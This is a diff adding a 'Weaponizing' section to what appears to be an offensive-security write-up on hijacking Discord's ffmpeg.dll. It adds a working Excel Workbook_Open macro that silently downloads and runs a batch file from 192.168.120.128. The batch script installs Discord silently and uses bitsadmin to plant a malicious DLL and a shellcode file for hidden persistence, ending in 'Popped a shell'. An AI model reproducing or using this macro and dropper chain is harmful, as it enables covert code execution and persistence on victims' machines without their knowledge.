@@ -53,11 +53,85 @@ Once you've compiled it, copy your DLL, the tmpXYZ.dll (rename it to ffmpeg.dll)
 
 Running Discord.exe executes a shellode. Great! Interestingly Discord itself crashes out with no visual artifacts but our cmd.exe process remains. This is ideal if we drop discord ourselves as a persistence mechanism without user knowledge. 
 
-## Weaponizing further. 
+## Weaponizing 
+It's quite simple to weaponize this DLL hijacking in an automated fashion. Below is a basic macro that downloads a batch file to execute installing discord and download the malicious files. 
 
--> TODO macro download and install discord via cmd.exe with no prompts, replace with malicious DLL and easylife. 
+The kicker for this method: 
+- Discord installs silently, no on screen artifacts. 
+- Discord uses it's own scheduled task on reboot giving us code exec.
+- Using ffmpeg.dll will give us code execution and crash the legitimate discord process with zero notification to the user. Likely to see WerFault & MiniDumps however. 
 
+
+</br> 
+
+
+### Excel Macro 
+
+```
+Private Sub Workbook_Open()
+
+Dim url, downloadPath, batPath, shell, winHttpReq
+url = "http://192.168.120.128/Update.txt"
+downloadPath = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local\Update.bat"
+batPath = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local"
+
+' Create a WinHttpRequest objects
+Set winHttpReq = CreateObject("WinHttp.WinHttpRequest.5.1")
+
+' Open a connection to the specified URL
+winHttpReq.Open "GET", url, False
+
+' Send the HTTP request and download the file
+winHttpReq.Send
+If winHttpReq.Status = 200 Then
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1 ' Binary
+    stream.Open
+    stream.Write winHttpReq.ResponseBody
+    stream.SaveToFile downloadPath, 2 ' Overwrite
+    stream.Close
+End If
+
+' Execute the downloaded BAT file
+Set shell = CreateObject("WScript.Shell")
+shell.Run batPath & "\Update.bat"
+
+Set shell = Nothing
+Set winHttpReq = Nothing
+
+
+End Sub
+```
+
+### Seemless discord install via .bat file. 
+```
+@echo off
+set DOWNLOAD_URL=https://dl.discordapp.net/distro/app/stable/win/x86/1.0.9012/DiscordSetup.exe
+set DOWNLOAD_DLL=http://192.168.120.128/ffmpeg.dll 
+set DOWNLOAD_BIN=http://192.168.120.128/pop.bin
+set DOWNLOAD_tmp=http://192.168.120.128/tmp108E.dll
+set DOWNLOAD_LOCATION=C:\Windows\Temp\Update.exe
+set EXECUTE_LOCATION=C:\Windows\Temp\
+
+set COPY_LOCATION=%LOCALAPPDATA%\Discord\app-1.0.9012\
+set DL_DLL=%LOCALAPPDATA%\Discord\app-1.0.9012\ffmpeg.dll
+set DL_tmp=%LOCALAPPDATA%\Discord\app-1.0.9012\tmp108E.dll
+set DL_bin=%LOCALAPPDATA%\Discord\app-1.0.9012\pop.bin
+
+
+bitsadmin /transfer myDownloadJob /priority normal %DOWNLOAD_URL% %DOWNLOAD_LOCATION%
+start "" "%EXECUTE_LOCATION%\Update.exe" --silent
+timeout /t 10
+bitsadmin /transfer myDownloadJob1 /priority normal %DOWNLOAD_DLL% %DL_DLL%
+bitsadmin /transfer myDownloadJob2 /priority normal %DOWNLOAD_BIN% %DL_bin%
+bitsadmin /transfer myDownloadJob3 /priority normal %DOWNLOAD_tmp% %DL_tmp%
+```
+
+### Result... 
+Popped a shell .. :) 
  
+![image](https://user-images.githubusercontent.com/46195001/232533881-7fd1d90a-1974-4672-afc6-be0f802171a1.png)
 
 
 
